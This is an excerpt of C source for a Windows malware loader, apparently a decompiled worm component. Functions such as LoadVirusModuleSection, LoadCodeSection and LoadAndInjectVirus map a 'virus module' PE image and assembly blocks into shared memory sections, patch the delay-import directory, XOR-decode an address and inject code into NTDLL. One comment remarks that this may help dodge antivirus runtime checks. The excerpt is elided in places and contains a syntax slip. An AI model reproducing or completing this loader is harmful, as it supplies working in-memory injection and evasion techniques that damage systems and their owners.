...
INT32 LoadVirusModuleSection(HANDLE hHandle, PGENERAL_INFO_BLOCK sInfoBlock,
  ...
  UINT32 iSectionsSize = sizeof(VIRUS_MODULE_BLOCKS_HEADER) +
                         pUnknownSegmentSize + pVirusModuleSize;

  INT32 iOpenMapViewFailed = SharedMapViewOfSection(
      hHandle, iSectionsSize, &hMapHandle, &pCurrAddr, &pBaseAddr);
  ...
  CopySegmentIntoSections(&pCurrAddr, pBaseAddr, &iSectionPointer,
                          &sVirusModuleBlocksHeader->UnknownSegment,
                          pUnknownSegment, pUnknownSegmentSize);
  pVirusImageBase = pCurrAddr;

  CopySegmentIntoSections(&pCurrAddr, pBaseAddr, &iSectionPointer,
                          &sVirusModuleBlocksHeader->VirusModuleSegment,
                          pVirusModule, pVirusModuleSize);
  pImageDOS = (PIMAGE_DOS_HEADER)pVirusImageBase;

  // if virusmodule has "MZ" magic for .exe and virus is within size bounds
  if ((UINT32)pVirusModuleSize >= 0x1000 && pImageDOS->e_magic == MZ_HEADER &&
      pImageDOS->e_lfanew + sizeof(IMAGE_OPTIONAL_HEADER) +
              sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD) <
          (UINT32)pVirusModuleSize) // (UINT32 *)pImageDOS[15] + 248 -> Section
                                    // ".text"
  {
    pImageNT =
        (PIMAGE_NT_HEADERS)((DWORD)pVirusImageBase + pImageDOS->e_lfanew);

    // According to the below references, each entry in the delay import table
    // is 32 bits
    //  so what the actual fuck is going on here. I suppose delayed injection
    //  would be a good way
    //  of dodging an AV's runtime check, as the virus is loaded into memory
    //  as-needed.
    ...
    if (pImageNT->OptionalHeader
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT]
            .Size == 72)
      pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT]
          .Size = 64; // Change Delay Import Directory Size
  }

  __memcpy(&sVirusModuleBlocksHeader->InformationBlock, sInfoBlock,
  ...
  *pOutSection = pBaseAddr;
  ...
  g_hardAddrs.UnmapViewOfFile(
      pBaseAddr); // Also unmaps sVirusModuleBlocks header
...
INT32 LoadAndInjectVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader,
  ...
  __memcpy(&sInfoBlockCopy, sInfoBlock,
           sizeof(GENERAL_INFO_BLOCK)); // Copy the information

  sInfoBlockCopy.OriginalAddress ^=
      XADDR_KEY; // Get the original address of the variable sInfoBlock
  ...
  iResult = BLOCK4_LoadVirusModuleInfo(
      ...
      (PVOID)sVirusModuleBlocksHeader->VirusModuleSegment.SegmentAddress,
      sVirusModuleBlocksHeader->VirusModuleSegment.SegmentSize);
  if (iResult)
    return iResult

        if (BLOCK4_InjectCodeIntoNTDLL(sASMCodeBlocksHeader,
                                       pHardAddrs)) return -4;
...
INT32 LoadCodeSection(HANDLE hHandle, PVOID pVirusModuleSection,
  ...
  UINT32 iSectionsSize = sizeof(ASM_CODE_BLOCKS_HEADER) + iASMBlock0Size +
                         iASMBlock1Size + iCodeBlockSize;

  // Because hHandle = GetCurrentProcess(), pBaseAddr1 == pViewBase
  INT32 iOpenMapViewFailed = SharedMapViewOfSection(
      hHandle, iSectionsSize, &pSectionHandle, &pBaseAddr1, &pViewBase);
  if (!iOpenMapViewFailed)
    return iOpenMapViewFailed;

  PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader =
      (PASM_CODE_BLOCKS_HEADER)pBaseAddr1;
  ...
  CopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer,
                          &sASMCodeBlocksHeader->ASMBlock1Segment,
                          __ASM_BLOCK1_0, iASMBlock1Size);

  CopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer,
                          &sASMCodeBlocksHeader->ASMBlock0Segment,
                          __ASM_BLOCK0_0, iASMBlock0Size);

  PVOID pCodeBlock = (PVOID)GetCodeBlock(sASMCodeBlocksHeader);
  CopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer,
                          &sASMCodeBlocksHeader->CodeBlockSegment, pCodeBlock,
                          iCodeBlockSize);
  ...
  //   I have no idea why.
  DWORD *tmp =
      (DWORD *)((DWORD)sASMCodeBlocksHeader + sizeof(ASM_CODE_BLOCKS_HEADER) +
                iASMBlock1Size + _SIZE(__ASM_BLOCK0_1, __ASM_BLOCK0_0));
  *tmp = (DWORD)sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress +
         _SIZE(__ASM_REF_3, __ASM_BLOCK1_0);

  // Put function address into the memory map
  sASMCodeBlocksHeader->ExecuteLibrary =
      sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress +
      GetRelativeExecuteLibraryPointer();
  sASMCodeBlocksHeader->AlignAddresses =
      sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress +
  ...
  *pCodeBlockPointer =
      (PVOID)sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress;
...
INT32 Setup(LPCWSTR szDebugModuleName, PVOID pVirusModule,
  ...
  iResult =
      LoadVirusModuleSection(GetCurrentProcess(), &sInfoBlock, pVirusModule,
                             iVirusModuleSize, -1, NULL, 0, &s_virusBlocksPTR);
  if (iResult)
    return iResult;
  ...
  if (bSetup) {
    iResult = LoadCodeSection(GetCurrentProcess(), s_virusBlocksPTR,
                              &s_codeBlockPTR, &s_ASMCodeBlocksPTR);
    if (iResult)
      return iResult;
  ...
  iResult = LoadAndInjectVirus((PASM_CODE_BLOCKS_HEADER)s_ASMCodeBlocksPTR,
                               (PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR,
                               &sInfoBlock);
  if (!iResult)
    *hVirusModule =
        ((PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR)->VirusModulePointer;
